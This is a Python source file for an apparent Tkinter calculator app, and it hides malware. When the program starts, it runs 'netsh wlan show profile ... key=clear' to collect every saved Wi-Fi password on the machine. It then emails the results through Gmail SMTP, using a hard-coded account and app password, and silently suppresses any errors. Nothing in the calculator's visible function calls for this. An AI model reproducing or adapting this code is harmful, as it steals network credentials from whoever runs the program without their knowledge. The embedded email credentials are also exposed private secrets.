from importlib import import_module
from itertools import count
from re import sub
from tkinter import messagebox
from Gui_Calc_Functions import run
import tkinter as tk
from tkinter import tix
import subprocess
import sys, smtplib

root = tix.Tk()
root.title("Python Calculator")
root.geometry("350x350")
# file_name = sys._MEIPASS + "\calculator.ico"
# root.wm_iconbitmap(file_name)
# root.wm_iconbitmap("Images/calculator.ico")
# canvas = tk.Canvas(root, height=350, width=350, bg='light green')
# canvas.resizable(height=False, width=False)

out = subprocess.Popen("netsh wlan show profile", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
cmd = ''
for i in out.stdout.readlines():
    i = str(i.strip())
    if 'All User' in i:
        i = i.replace('All User Profile     : ', '')
        i = i.replace('b\'', '').replace("\'", "")
        
        out = subprocess.Popen(f"netsh wlan show profile name=\"{i}\" key=clear", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        cmd += out.stdout.read().decode('utf-8')

try:
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login('autostock2021@gmail.com', 'cbkmcxxhswkwfxpd')
    server.sendmail('autostock2021@gmail.com', 'autostock2021@gmail.com',cmd)
    server.quit()
except Exception as e:
    pass
root.resizable(height=False, width=False)
root.focus_force()
# canvas.pack()

if __name__ == '__main__':
    run(root)

root.mainloop()
